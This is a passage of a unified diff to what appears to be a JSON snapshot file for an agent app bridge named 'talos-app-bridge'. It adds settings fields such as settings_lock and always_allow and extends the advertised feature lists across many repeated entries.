@@ -91,6 +91,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -149,22 +156,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -188,25 +205,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -220,22 +247,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -301,6 +338,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -381,6 +425,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -599,6 +650,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -657,22 +715,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -696,25 +764,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -728,22 +806,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -809,6 +897,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -889,6 +984,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -1389,6 +1491,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -1447,22 +1556,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -1486,25 +1605,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -1518,22 +1647,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -1599,6 +1738,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -1679,6 +1825,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -2190,6 +2343,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -2248,22 +2408,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -2287,25 +2457,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -2319,22 +2499,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -2400,6 +2590,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -2480,6 +2677,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -2827,6 +3031,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -2885,22 +3096,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -2924,25 +3145,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -2956,22 +3187,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -3037,6 +3278,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -3117,6 +3365,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -3407,6 +3662,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -3465,22 +3727,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -3504,25 +3776,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -3536,22 +3818,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -3617,6 +3909,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -3697,6 +3996,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -3948,6 +4254,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -4006,22 +4319,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -4045,25 +4368,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -4077,22 +4410,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -4158,6 +4501,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -4238,6 +4588,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -4476,6 +4833,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -4534,22 +4898,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
           "agent_config_rev": 0
@@ -4573,25 +4947,35 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
+              "settings-lock/1",
+              "always-allow/1",
+              "problems-install/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -4605,22 +4989,32 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1",
+            "files-put/1",
+            "files-sent/1",
+            "memory-roots/1",
+            "settings-lock/1",
+            "always-allow/1",
+            "problems-install/1"
           ]
         }
       },
@@ -4686,6 +5080,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -4766,6 +5167,13 @@
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
             "memory_browser": true,
+            "media_keep_days": null,
+            "settings_lock": false,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "always_allow": [],
             "mirror": {
               "telegram": "off"
             }
@@ -4927,22 +5335,26 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1"
             ]
           },
           "agent_config_rev": 0
@@ -4966,25 +5378,29 @@
             "last_seen": "<wall-time>",
             "queue_depth": 0,
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1"
             ]
           },
-          "features": ["schedules/1", "schedules/2", "thread-sessions/1"]
+          "features": ["schedules/1", "schedules/2", "thread-sessions/1", "bridge-standby/1"]
         }
       },
       {
@@ -4998,22 +5414,26 @@
           "last_seen": "<wall-time>",
           "queue_depth": 0,
           "features": [
+            "<host>",
+            "threads/2",
+            "thread-sessions/1",
+            "session/1",
+            "run/1",
+            "original-ts/1",
+            "driving/1",
             "schedules/1",
             "schedules/2",
             "heartbeat/1",
             "native_act/1",
-            "session/1",
-            "driving/1",
-            "original-ts/1",
-            "run/1",
-            "threads/2",
-            "thread-sessions/1",
             "search/1",
             "memory/1",
+            "memory-graph/1",
             "health/1",
             "speak/1",
             "problems/1",
-            "folders/1"
+            "folders/1",
+            "files/1",
+            "agents-md/1"
           ]
         }
       },
@@ -5242,6 +5662,13 @@
             },
             "permission_relay": true,
             "session_models": ["default", "opus", "sonnet", "haiku"],
+            "media_keep_days": null,
+            "dev": {
+              "thread_fence": true,
+              "note_lookup": true
+            },
+            "settings_lock": false,
+            "always_allow": [],
             "memory_browser": true
           },
           "threads": [
@@ -5300,22 +5727,32 @@
             "name": "talos-app-bridge",
             "version": "<secret>",
             "features": [
+              "<host>",
+              "threads/2",
+              "thread-sessions/1",
+              "session/1",
+              "run/1",
+              "original-ts/1",
+              "driving/1",
               "schedules/1",
               "schedules/2",
               "heartbeat/1",
               "native_act/1",
-              "session/1",
-              "driving/1",
-              "original-ts/1",
-              "run/1",
-              "threads/2",
-              "thread-sessions/1",
               "search/1",
               "memory/1",
+              "memory-graph/1",
               "health/1",
               "speak/1",
               "problems/1",
-              "folders/1"
+              "folders/1",
+              "files/1",
+              "agents-md/1",
+              "files-put/1",
+              "files-sent/1",
+              "memory-roots/1",
